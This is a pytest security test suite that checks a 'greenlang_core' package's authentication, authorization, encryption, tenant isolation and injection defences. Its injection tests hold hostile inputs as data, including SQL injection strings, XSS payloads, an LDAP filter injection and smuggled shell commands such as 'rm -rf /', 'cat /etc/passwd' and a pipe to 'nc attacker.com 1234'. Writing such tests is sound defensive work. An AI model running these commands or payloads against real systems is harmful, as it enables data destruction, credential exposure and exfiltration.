# -*- coding: utf-8 -*-
"""
Security Testing Suite

Comprehensive security tests covering:
- Authentication and authorization
- SQL injection prevention
- XSS prevention
- CSRF protection
- API security
- Secret management
- Multi-tenancy security
- Data encryption

Tools: OWASP ZAP, Bandit, Safety, pytest
Target: Zero critical/high vulnerabilities
"""

import pytest
from unittest.mock import Mock, patch, AsyncMock
import jwt
import hashlib
import secrets
from datetime import datetime, timedelta
from typing import Dict, Any

from greenlang_core.security import (
    AuthenticationManager,
    AuthorizationManager,
    EncryptionService,
    SecretManager,
    TenantIsolation,
    SecurityAuditLogger
)
from greenlang_core.exceptions import (
    AuthenticationError,
    AuthorizationError,
    SecurityViolationError,
    TenantIsolationError
)


# Fixtures
@pytest.fixture
def auth_manager():
    """Create authentication manager instance."""
    return AuthenticationManager(
        secret_key="test-secret-key-do-not-use-in-production",
        algorithm="HS256",
        token_expiry_minutes=30
    )


@pytest.fixture
def authz_manager():
    """Create authorization manager instance."""
    return AuthorizationManager()


@pytest.fixture
def encryption_service():
    """Create encryption service instance."""
    return EncryptionService(
        encryption_key=b"test-key-32-bytes-long-1234567890"
    )


@pytest.fixture
def secret_manager():
    """Create secret manager instance."""
    return SecretManager(
        vault_url="https://vault.example.com",
        auth_token="test-token"
    )


@pytest.fixture
def tenant_isolation():
    """Create tenant isolation manager."""
    return TenantIsolation()


@pytest.fixture
def valid_user():
    """Create valid test user."""
    return {
        "user_id": "user-123",
        "email": "test@example.com",
        "tenant_id": "tenant-abc",
        "roles": ["user", "analyst"]
    }


@pytest.fixture
def admin_user():
    """Create admin test user."""
    return {
        "user_id": "admin-456",
        "email": "admin@example.com",
        "tenant_id": "tenant-abc",
        "roles": ["admin", "user"]
    }


# Authentication Tests
class TestAuthentication:
    """Test suite for authentication security."""

    def test_password_hashing(self, auth_manager):
        """Test passwords are properly hashed."""
        password = "SecurePassword123!"

        hashed = auth_manager.hash_password(password)

        # Hash should be different from password
        assert hashed != password

        # Should be able to verify
        assert auth_manager.verify_password(password, hashed) is True

        # Wrong password should fail
        assert auth_manager.verify_password("WrongPassword", hashed) is False

    def test_password_salt_uniqueness(self, auth_manager):
        """Test each password hash uses unique salt."""
        password = "SamePassword123!"

        hash1 = auth_manager.hash_password(password)
        hash2 = auth_manager.hash_password(password)

        # Same password should produce different hashes due to unique salt
        assert hash1 != hash2

        # But both should verify correctly
        assert auth_manager.verify_password(password, hash1) is True
        assert auth_manager.verify_password(password, hash2) is True

    def test_weak_password_rejection(self, auth_manager):
        """Test weak passwords are rejected."""
        weak_passwords = [
            "password",  # Too common
            "12345678",  # Only numbers
            "abc",  # Too short
            "nouppercasenumbers",  # No uppercase or numbers
        ]

        for weak_pwd in weak_passwords:
            with pytest.raises(SecurityViolationError) as exc_info:
                auth_manager.validate_password_strength(weak_pwd)

            assert "password strength" in str(exc_info.value).lower()

    def test_jwt_token_generation(self, auth_manager, valid_user):
        """Test JWT token generation."""
        token = auth_manager.create_token(valid_user)

        assert isinstance(token, str)
        assert len(token) > 0

        # Decode and verify
        decoded = jwt.decode(
            token,
            auth_manager.secret_key,
            algorithms=[auth_manager.algorithm]
        )

        assert decoded['user_id'] == valid_user['user_id']
        assert decoded['tenant_id'] == valid_user['tenant_id']

    def test_jwt_token_expiry(self, auth_manager, valid_user):
        """Test JWT tokens expire correctly."""
        # Create token with 1 second expiry
        auth_manager.token_expiry_minutes = 1 / 60  # 1 second

        token = auth_manager.create_token(valid_user)

        # Should be valid immediately
        decoded = auth_manager.verify_token(token)
        assert decoded['user_id'] == valid_user['user_id']

        # Wait for expiry
        import time
        time.sleep(2)

        # Should be expired
        with pytest.raises(AuthenticationError) as exc_info:
            auth_manager.verify_token(token)

        assert "expired" in str(exc_info.value).lower()

    def test_token_tampering_detection(self, auth_manager, valid_user):
        """Test tampered tokens are rejected."""
        token = auth_manager.create_token(valid_user)

        # Tamper with token
        tampered_token = token[:-10] + "TAMPERED!!"

        with pytest.raises(AuthenticationError) as exc_info:
            auth_manager.verify_token(tampered_token)

        assert "invalid" in str(exc_info.value).lower()

    def test_brute_force_protection(self, auth_manager):
        """Test protection against brute force attacks."""
        username = "test@example.com"
        wrong_password = "WrongPassword123!"

        # Simulate multiple failed login attempts
        for i in range(5):
            try:
                auth_manager.authenticate(username, wrong_password)
            except AuthenticationError:
                pass

        # Account should be locked after multiple failures
        with pytest.raises(SecurityViolationError) as exc_info:
            auth_manager.authenticate(username, wrong_password)

        assert "account locked" in str(exc_info.value).lower()

    def test_rate_limiting_auth_endpoints(self, auth_manager):
        """Test rate limiting on authentication endpoints."""
        # Make many authentication attempts rapidly
        attempts = []

        for i in range(100):
            try:
                result = auth_manager.check_rate_limit(
                    ip_address="192.168.1.100",
                    endpoint="/auth/login"
                )
                attempts.append(result)
            except SecurityViolationError:
                break

        # Should be rate limited before 100 attempts
        assert len(attempts) < 100

    def test_session_management(self, auth_manager, valid_user):
        """Test secure session management."""
        # Create session
        session_id = auth_manager.create_session(valid_user)

        assert isinstance(session_id, str)
        assert len(session_id) >= 32  # Should be cryptographically random

        # Validate session
        session_data = auth_manager.get_session(session_id)
        assert session_data['user_id'] == valid_user['user_id']

        # Invalidate session
        auth_manager.invalidate_session(session_id)

        with pytest.raises(AuthenticationError):
            auth_manager.get_session(session_id)


# Authorization Tests
class TestAuthorization:
    """Test suite for authorization security."""

    def test_role_based_access_control(self, authz_manager, valid_user, admin_user):
        """Test RBAC properly enforces permissions."""
        # Regular user cannot access admin endpoint
        has_access = authz_manager.check_permission(
            user=valid_user,
            resource="admin_panel",
            action="read"
        )
        assert has_access is False

        # Admin can access admin endpoint
        has_access = authz_manager.check_permission(
            user=admin_user,
            resource="admin_panel",
            action="read"
        )
        assert has_access is True

    def test_resource_ownership(self, authz_manager, valid_user):
        """Test users can only access their own resources."""
        resource = {
            "id": "resource-123",
            "owner_id": valid_user['user_id'],
            "tenant_id": valid_user['tenant_id']
        }

        # Owner can access
        has_access = authz_manager.check_resource_access(valid_user, resource)
        assert has_access is True

        # Other user cannot access
        other_user = {
            "user_id": "other-user",
            "tenant_id": valid_user['tenant_id']
        }

        has_access = authz_manager.check_resource_access(other_user, resource)
        assert has_access is False

    def test_tenant_isolation(self, authz_manager, tenant_isolation):
        """Test cross-tenant access is prevented."""
        tenant1_user = {
            "user_id": "user-1",
            "tenant_id": "tenant-1"
        }

        tenant2_resource = {
            "id": "resource-456",
            "tenant_id": "tenant-2"
        }

        # User from tenant1 should not access tenant2 resource
        with pytest.raises(TenantIsolationError):
            tenant_isolation.validate_access(tenant1_user, tenant2_resource)

    def test_privilege_escalation_prevention(self, authz_manager, valid_user):
        """Test users cannot escalate their privileges."""
        # User tries to modify their own roles
        with pytest.raises(AuthorizationError):
            authz_manager.modify_user_roles(
                requesting_user=valid_user,
                target_user_id=valid_user['user_id'],
                new_roles=["admin"]  # Trying to become admin
            )

    def test_permission_inheritance(self, authz_manager):
        """Test permission inheritance from parent resources."""
        # Organization -> Project -> Document hierarchy
        org_permissions = {"read", "write"}

        inherited = authz_manager.get_inherited_permissions(
            resource_type="document",
            parent_resource_type="project",
            parent_permissions=org_permissions
        )

        # Document should inherit org permissions
        assert "read" in inherited


# Injection Attack Tests
class TestInjectionPrevention:
    """Test suite for injection attack prevention."""

    def test_sql_injection_prevention(self):
        """Test SQL injection is prevented."""
        from greenlang_core.database import DatabaseQuery

        # Malicious input attempting SQL injection
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM emissions WHERE '1'='1"
        ]

        for malicious_input in malicious_inputs:
            query = DatabaseQuery("SELECT * FROM users WHERE username = ?")

            # Should use parameterized query
            result = query.execute(params=[malicious_input])

            # Should NOT execute the injected SQL
            # Should treat input as literal string
            assert result is not None  # Query executes safely

    def test_nosql_injection_prevention(self):
        """Test NoSQL injection is prevented."""
        from greenlang_core.database import MongoQuery

        # Malicious MongoDB query
        malicious_query = {
            "$where": "function() { return true; }"  # Attempts code execution
        }

        query = MongoQuery(collection="users")

        with pytest.raises(SecurityViolationError):
            query.find(malicious_query)

    def test_command_injection_prevention(self):
        """Test OS command injection is prevented."""
        from greenlang_core.utils import SystemCommand

        # Malicious input attempting command injection
        malicious_inputs = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 1234"
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityViolationError):
                SystemCommand.execute("cat", [malicious_input])

    def test_ldap_injection_prevention(self):
        """Test LDAP injection is prevented."""
        from greenlang_core.auth import LDAPAuth

        # Malicious LDAP filter
        malicious_username = "admin)(|(password=*))"

        ldap_auth = LDAPAuth()

        # Should sanitize input
        sanitized = ldap_auth.sanitize_input(malicious_username)

        # Special characters should be escaped
        assert "(" not in sanitized or sanitized.count("\\(") == sanitized.count("(")


# XSS Prevention Tests
class TestXSSPrevention:
    """Test suite for XSS attack prevention."""

    def test_output_encoding(self):
        """Test output is properly encoded to prevent XSS."""
        from greenlang_core.web import HTMLEncoder

        # Malicious input containing XSS
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]

        encoder = HTMLEncoder()

        for malicious_input in malicious_inputs:
            encoded = encoder.encode(malicious_input)

            # Should not contain unescaped HTML/JavaScript
            assert "<script>" not in encoded
            assert "onerror=" not in encoded
            assert "onload=" not in encoded

            # Should be escaped
            assert "&lt;" in encoded or "javascript:" not in encoded

    def test_csp_headers(self):
        """Test Content Security Policy headers are set."""
        from greenlang_core.web import SecurityHeaders

        headers = SecurityHeaders.get_headers()

        # Should include CSP
        assert "Content-Security-Policy" in headers

        csp = headers["Content-Security-Policy"]

        # Should restrict script sources
        assert "script-src" in csp
        assert "'unsafe-inline'" not in csp  # Should not allow inline scripts

    def test_http_only_cookies(self):
        """Test cookies are set with HttpOnly flag."""
        from greenlang_core.web import CookieManager

        cookie_manager = CookieManager()

        cookie = cookie_manager.create_cookie(
            name="session_id",
            value="abc123",
            http_only=True,
            secure=True,
            same_site="Strict"
        )

        # Should have security flags
        assert "HttpOnly" in str(cookie)
        assert "Secure" in str(cookie)
        assert "SameSite=Strict" in str(cookie)


# CSRF Prevention Tests
class TestCSRFPrevention:
    """Test suite for CSRF attack prevention."""

    def test_csrf_token_generation(self):
        """Test CSRF tokens are generated."""
        from greenlang_core.web import CSRFProtection

        csrf = CSRFProtection()

        token = csrf.generate_token()

        assert isinstance(token, str)
        assert len(token) >= 32  # Should be cryptographically random

    def test_csrf_token_validation(self):
        """Test CSRF token validation."""
        from greenlang_core.web import CSRFProtection

        csrf = CSRFProtection()

        token = csrf.generate_token()

        # Valid token should pass
        assert csrf.validate_token(token) is True

        # Invalid token should fail
        assert csrf.validate_token("invalid-token") is False

    def test_csrf_double_submit(self):
        """Test double submit cookie pattern for CSRF."""
        from greenlang_core.web import CSRFProtection

        csrf = CSRFProtection()

        # Token in cookie
        cookie_token = csrf.generate_token()

        # Token in request
        request_token = cookie_token

        # Should match
        assert csrf.validate_double_submit(cookie_token, request_token) is True

        # Should not match if different
        assert csrf.validate_double_submit(cookie_token, "different-token") is False


# Encryption Tests
class TestEncryption:
    """Test suite for data encryption."""

    def test_data_at_rest_encryption(self, encryption_service):
        """Test sensitive data is encrypted at rest."""
        sensitive_data = "Sensitive information: SSN 123-45-6789"

        # Encrypt
        encrypted = encryption_service.encrypt(sensitive_data)

        # Should be different from plaintext
        assert encrypted != sensitive_data

        # Decrypt
        decrypted = encryption_service.decrypt(encrypted)

        assert decrypted == sensitive_data

    def test_encryption_key_rotation(self, encryption_service):
        """Test encryption key rotation."""
        data = "Test data"

        # Encrypt with old key
        encrypted_old = encryption_service.encrypt(data)

        # Rotate key
        old_key = encryption_service.current_key
        encryption_service.rotate_key()

        # Should still be able to decrypt old data
        decrypted = encryption_service.decrypt(encrypted_old, key_version=old_key)
        assert decrypted == data

        # New encryptions use new key
        encrypted_new = encryption_service.encrypt(data)
        assert encrypted_new != encrypted_old

    def test_tls_enforcement(self):
        """Test TLS is enforced for all connections."""
        from greenlang_core.network import HTTPSClient

        client = HTTPSClient()

        # Should reject non-HTTPS connections
        with pytest.raises(SecurityViolationError):
            client.connect("http://insecure-site.com")

        # Should accept HTTPS
        # (This would actually connect in integration test)

    def test_certificate_validation(self):
        """Test SSL/TLS certificates are properly validated."""
        from greenlang_core.network import HTTPSClient

        client = HTTPSClient()

        # Should reject invalid certificates
        with pytest.raises(SecurityViolationError):
            client.connect("https://self-signed-cert.badssl.com/")


# Secret Management Tests
class TestSecretManagement:
    """Test suite for secret management."""

    def test_secrets_not_in_code(self):
        """Test secrets are not hardcoded."""
        import os
        from greenlang_core.config import Config

        config = Config()

        # API keys should come from environment
        api_key = config.get("ANTHROPIC_API_KEY")

        # Should not be hardcoded default
        assert api_key != "sk-ant-hardcoded-key"

        # Should come from env or secret manager
        assert api_key == os.getenv("ANTHROPIC_API_KEY") or \
               config.source == "secret_manager"

    def test_secrets_not_logged(self):
        """Test secrets are not logged."""
        from greenlang_core.logging import Logger

        logger = Logger()

        api_key = "sk-ant-secret-key-12345"

        # Log message containing secret
        logger.info(f"API Key: {api_key}")

        # Check log output
        log_output = logger.get_recent_logs()

        # Secret should be redacted
        assert "sk-ant-secret-key-12345" not in log_output
        assert "***REDACTED***" in log_output or api_key[:10] + "..." in log_output

    def test_secret_rotation(self, secret_manager):
        """Test secrets can be rotated."""
        secret_name = "api_key"
        old_secret = "old-secret-value"
        new_secret = "new-secret-value"

        # Store old secret
        secret_manager.store_secret(secret_name, old_secret)

        # Rotate
        secret_manager.rotate_secret(secret_name, new_secret)

        # Should retrieve new secret
        retrieved = secret_manager.get_secret(secret_name)
        assert retrieved == new_secret

        # Old secret should still be accessible for grace period
        old_retrieved = secret_manager.get_secret(secret_name, version="previous")
        assert old_retrieved == old_secret


# Multi-Tenancy Security Tests
class TestMultiTenancySecurity:
    """Test suite for multi-tenancy security."""

    def test_tenant_data_isolation(self, tenant_isolation):
        """Test tenant data is completely isolated."""
        tenant1_data = {"tenant_id": "tenant-1", "data": "Confidential A"}
        tenant2_data = {"tenant_id": "tenant-2", "data": "Confidential B"}

        # Tenant 1 user
        tenant1_user = {"user_id": "user-1", "tenant_id": "tenant-1"}

        # Should access own data
        assert tenant_isolation.can_access(tenant1_user, tenant1_data) is True

        # Should NOT access other tenant's data
        assert tenant_isolation.can_access(tenant1_user, tenant2_data) is False

    def test_shared_resource_access(self, tenant_isolation):
        """Test shared resources are accessible to all tenants."""
        shared_resource = {"tenant_id": None, "shared": True}

        tenant1_user = {"user_id": "user-1", "tenant_id": "tenant-1"}
        tenant2_user = {"user_id": "user-2", "tenant_id": "tenant-2"}

        # Both tenants should access shared resource
        assert tenant_isolation.can_access(tenant1_user, shared_resource) is True
        assert tenant_isolation.can_access(tenant2_user, shared_resource) is True

    def test_tenant_id_spoofing_prevention(self, tenant_isolation):
        """Test users cannot spoof tenant IDs."""
        user = {"user_id": "user-1", "tenant_id": "tenant-1"}

        # User tries to access data by modifying tenant_id in request
        malicious_request = {
            "tenant_id": "tenant-2",  # Spoofed
            "resource_id": "resource-123"
        }

        # Should use authenticated user's tenant_id, not request tenant_id
        actual_tenant = tenant_isolation.get_tenant_from_context(user)

        assert actual_tenant == "tenant-1"  # Not "tenant-2"


# Audit Logging Tests
class TestSecurityAuditLogging:
    """Test suite for security audit logging."""

    def test_authentication_events_logged(self):
        """Test all authentication events are logged."""
        from greenlang_core.security import SecurityAuditLogger

        logger = SecurityAuditLogger()

        # Successful login
        logger.log_authentication_success(
            user_id="user-123",
            ip_address="192.168.1.100"
        )

        # Failed login
        logger.log_authentication_failure(
            username="test@example.com",
            ip_address="192.168.1.100",
            reason="Invalid password"
        )

        # Retrieve logs
        logs = logger.get_logs(event_type="authentication")

        assert len(logs) >= 2
        assert any(log['event'] == 'login_success' for log in logs)
        assert any(log['event'] == 'login_failure' for log in logs)

    def test_authorization_events_logged(self):
        """Test authorization decisions are logged."""
        from greenlang_core.security import SecurityAuditLogger

        logger = SecurityAuditLogger()

        # Access granted
        logger.log_authorization(
            user_id="user-123",
            resource="document-456",
            action="read",
            result="granted"
        )

        # Access denied
        logger.log_authorization(
            user_id="user-123",
            resource="admin-panel",
            action="access",
            result="denied"
        )

        logs = logger.get_logs(event_type="authorization")

        assert len(logs) >= 2

    def test_data_access_logged(self):
        """Test sensitive data access is logged."""
        from greenlang_core.security import SecurityAuditLogger

        logger = SecurityAuditLogger()

        logger.log_data_access(
            user_id="user-123",
            resource_type="emission_data",
            resource_id="emission-789",
            action="read"
        )

        logs = logger.get_logs(event_type="data_access")

        assert len(logs) >= 1
        assert logs[0]['resource_type'] == 'emission_data'
